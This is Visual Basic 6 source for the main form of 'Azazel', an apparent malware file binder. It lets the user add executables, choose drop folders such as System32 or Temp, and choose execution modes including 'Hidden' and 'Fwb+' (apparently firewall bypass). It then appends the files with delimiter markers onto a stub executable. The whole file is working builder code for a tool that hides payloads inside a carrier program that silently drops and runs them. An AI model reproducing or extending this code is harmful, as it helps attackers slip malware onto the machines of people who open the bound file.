VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form frmMain 
   Caption         =   "Azazel"
   ClientHeight    =   2985
   ClientLeft      =   165
   ClientTop       =   735
   ClientWidth     =   10245
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   199
   ScaleMode       =   3  'Pixel
   ScaleWidth      =   683
   StartUpPosition =   3  'Windows-Standard
   Begin MSComDlg.CommonDialog cdFile 
      Left            =   1800
      Top             =   3960
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin MSComctlLib.StatusBar stbStatus 
      Align           =   2  'Unten ausrichten
      Height          =   255
      Left            =   0
      TabIndex        =   1
      Top             =   2730
      Width           =   10245
      _ExtentX        =   18071
      _ExtentY        =   450
      Style           =   1
      SimpleText      =   "Azazel loaded.."
      _Version        =   393216
      BeginProperty Panels {8E3867A5-8586-11D1-B16A-00C0F0283628} 
         NumPanels       =   1
         BeginProperty Panel1 {8E3867AB-8586-11D1-B16A-00C0F0283628} 
         EndProperty
      EndProperty
   End
   Begin MSComctlLib.ListView lsvFiles 
      Height          =   2415
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   10215
      _ExtentX        =   18018
      _ExtentY        =   4260
      View            =   3
      LabelWrap       =   -1  'True
      HideSelection   =   0   'False
      OLEDropMode     =   1
      AllowReorder    =   -1  'True
      FullRowSelect   =   -1  'True
      GridLines       =   -1  'True
      _Version        =   393217
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      Appearance      =   0
      OLEDropMode     =   1
      NumItems        =   5
      BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         Text            =   "File"
         Object.Width           =   5292
      EndProperty
      BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   1
         Text            =   "Filename"
         Object.Width           =   2540
      EndProperty
      BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   2
         Text            =   "Size"
         Object.Width           =   2540
      EndProperty
      BeginProperty ColumnHeader(4) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   3
         Text            =   "Drop"
         Object.Width           =   2540
      EndProperty
      BeginProperty ColumnHeader(5) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   4
         Text            =   "Execution"
         Object.Width           =   2540
      EndProperty
   End
   Begin VB.Menu mnuMain 
      Caption         =   "Main"
      Begin VB.Menu mnuAdd 
         Caption         =   "Add.."
      End
      Begin VB.Menu mnuRemove 
         Caption         =   "Remove"
      End
      Begin VB.Menu mnuSeperator1 
         Caption         =   "-"
      End
      Begin VB.Menu mnuDrop 
         Caption         =   "Drop to"
         Begin VB.Menu mnuAppPath 
            Caption         =   "App.Path (where the stub gets placed)"
         End
         Begin VB.Menu mnuSystem 
            Caption         =   "System (C:\Windows\System32)"
         End
         Begin VB.Menu mnuTemp 
            Caption         =   "Temp (C:\Documents and Settings\User\Local Settings\Temp)"
         End
         Begin VB.Menu mnuWindows 
            Caption         =   "Windows (C:\Windows)"
         End
         Begin VB.Menu mnuCustomDrop 
            Caption         =   "Custom.."
         End
      End
      Begin VB.Menu mnuExecution 
         Caption         =   "Execution"
         Begin VB.Menu mnuNormal 
            Caption         =   "Normal"
         End
         Begin VB.Menu mnuHidden 
            Caption         =   "Hidden"
         End
         Begin VB.Menu mnuFwb 
            Caption         =   "Fwb+"
         End
         Begin VB.Menu mnuNon 
            Caption         =   "No"
         End
      End
      Begin VB.Menu mnuSeperator2 
         Caption         =   "-"
      End
      Begin VB.Menu mnuBind 
         Caption         =   "Bind"
      End
      Begin VB.Menu mnuSperator3 
         Caption         =   "-"
      End
      Begin VB.Menu mnuAbout 
         Caption         =   "About"
      End
      Begin VB.Menu mnuExit 
         Caption         =   "Exit"
      End
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Const Right = 2

Private Sub Form_Load()
    mnuMain.Visible = False
    lsvFiles.Left = "0"
    lsvFiles.Top = "0"
End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
    Cancel = True
    End
End Sub

Private Sub Form_Resize()
    On Error Resume Next
    lsvFiles.Width = frmMain.Width
    lsvFiles.Height = frmMain.ScaleHeight - stbStatus.Height
End Sub

Private Sub lsvFiles_BeforeLabelEdit(Cancel As Integer)
    Cancel = True
End Sub

Private Sub lsvFiles_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Button = Right Then
        PopupMenu mnuMain
    End If
End Sub

Private Sub mnuAbout_Click()
    LoadAbout
End Sub

Private Sub mnuAdd_Click()
    On Error GoTo blah
    cdFile.DialogTitle = "Select the File you want to add.."
    cdFile.CancelError = True
    cdFile.ShowOpen
    For i = 1 To lsvFiles.ListItems.Count
        If lsvFiles.ListItems.Item(i).Text = cdFile.Filename Then
            MsgBox "File already in list", 16, "Azazel"
            Exit Sub
        End If
    Next i
    Set Item = lsvFiles.ListItems.Add
        Item.Text = cdFile.Filename
        Item.SubItems(1) = cdFile.FileTitle
        Item.SubItems(2) = Filesize(cdFile.Filename)
        Item.SubItems(3) = "Temp"
        Item.SubItems(4) = "Fwb+"
    stbStatus.SimpleText = lsvFiles.ListItems.Count & " Files have been added"
blah:
End Sub

Private Sub mnuAppPath_Click()
    If lsvFiles.ListItems.Count = 0 Then
        MsgBox "There are no files added", 16, "Azazel"
        Exit Sub
    End If
    Set Item = lsvFiles.SelectedItem
        Item.SubItems(3) = "App.Path"
End Sub

Private Sub mnuBind_Click()
    On Error GoTo blah
    Dim Buffer() As Byte
    Dim ResBuffer() As Byte
    Dim Stubpath As String
    Dim Filename As String
    Dim DropPath As String
    Dim Execution As String

    cdFile.CancelError = True
    cdFile.DialogTitle = "Choose, where to save the binded file.."
    cdFile.ShowSave
    Stubpath = cdFile.Filename
    
    ResBuffer() = LoadResData(101, "STUB")
    Open Stubpath For Binary As #1
    Put #1, , ResBuffer()
    Close #1
    
    For i = 1 To lsvFiles.ListItems.Count
        Filename = lsvFiles.ListItems.Item(i).SubItems(1)
        DropPath = lsvFiles.ListItems.Item(i).SubItems(3)
        Execution = lsvFiles.ListItems.Item(i).SubItems(4)

        
        Open lsvFiles.ListItems.Item(i).Text For Binary As #1
        ReDim Buffer(LOF(1)) As Byte
        Get #1, , Buffer()
        Close #1
        
        Open Stubpath For Binary As #1
        Put #1, LOF(1) + 1, "<F1l3>"
        Put #1, LOF(1) + 1, Buffer()
        Put #1, LOF(1) + 1, "<S3t5>"
        Put #1, LOF(1) + 1, Filename & "||" & DropPath & "||" & Execution
        Close #1
        
        Erase Buffer
        Filename = ""
        DropPath = ""
        Execution = ""
    Next i
    MsgBox lsvFiles.ListItems.Count & " Files binded successfully" & Chr(13) & Chr(13) & Stubpath, 64, "Azazel"
blah:
End Sub

Private Sub mnuCustomDrop_Click()
    If lsvFiles.ListItems.Count = 0 Then
        MsgBox "There are no files added", 16, "Azazel"
        Exit Sub
    End If
    Set Item = lsvFiles.SelectedItem
        frmInput.Show vbModal
        If Text1Output = "usercancel" Then
            Exit Sub
        Else
            Item.SubItems(3) = Text1Output
        End If
End Sub

Private Sub mnuExit_Click()
    End
End Sub

Private Function Filesize(File As String) As String
    Dim bytes As String
    Dim size As String
    bytes = FileLen(File)
    If bytes > 1024 Then
        size = " KB"
        bytes = bytes / 1024
    Else
        size = " Bytes"
    End If
    If bytes > 1024 Then
        size = " MB"
        bytes = bytes / 1024
    End If
    Filesize = Round(bytes, 2) & size
End Function

Private Sub mnuFwb_Click()
    If lsvFiles.ListItems.Count = 0 Then
        MsgBox "There are no files added", 16, "Azazel"
        Exit Sub
    End If
    Set Item = lsvFiles.SelectedItem
        Item.SubItems(4) = "Fwb+"
End Sub

Private Sub mnuHidden_Click()
    If lsvFiles.ListItems.Count = 0 Then
        MsgBox "There are no files added", 16, "Azazel"
        Exit Sub
    End If
    Set Item = lsvFiles.SelectedItem
        Item.SubItems(4) = "Hidden"
End Sub

Private Sub mnuNon_Click()
    If lsvFiles.ListItems.Count = 0 Then
        MsgBox "There are no files added", 16, "Azazel"
        Exit Sub
    End If
    Set Item = lsvFiles.SelectedItem
        Item.SubItems(4) = "No"
End Sub

Private Sub mnuNormal_Click()
    If lsvFiles.ListItems.Count = 0 Then
        MsgBox "There are no files added", 16, "Azazel"
        Exit Sub
    End If
    Set Item = lsvFiles.SelectedItem
        Item.SubItems(4) = "Normal"
End Sub

Private Sub mnuRemove_Click()
    On Error GoTo blah
    lsvFiles.ListItems.Remove lsvFiles.SelectedItem.Index
    stbStatus.SimpleText = lsvFiles.ListItems.Count & " Files have been added"
blah:
End Sub

Private Sub mnuSystem_Click()
    If lsvFiles.ListItems.Count = 0 Then
        MsgBox "There are no files added", 16, "Azazel"
        Exit Sub
    End If
    Set Item = lsvFiles.SelectedItem
        Item.SubItems(3) = "System"
End Sub

Private Sub mnuTemp_Click()
    If lsvFiles.ListItems.Count = 0 Then
        MsgBox "There are no files added", 16, "Azazel"
        Exit Sub
    End If
    Set Item = lsvFiles.SelectedItem
        Item.SubItems(3) = "Temp"
End Sub

Private Sub mnuWindows_Click()
    If lsvFiles.ListItems.Count = 0 Then
        MsgBox "There are no files added", 16, "Azazel"
        Exit Sub
    End If
    Set Item = lsvFiles.SelectedItem
        Item.SubItems(3) = "Windows"
End Sub
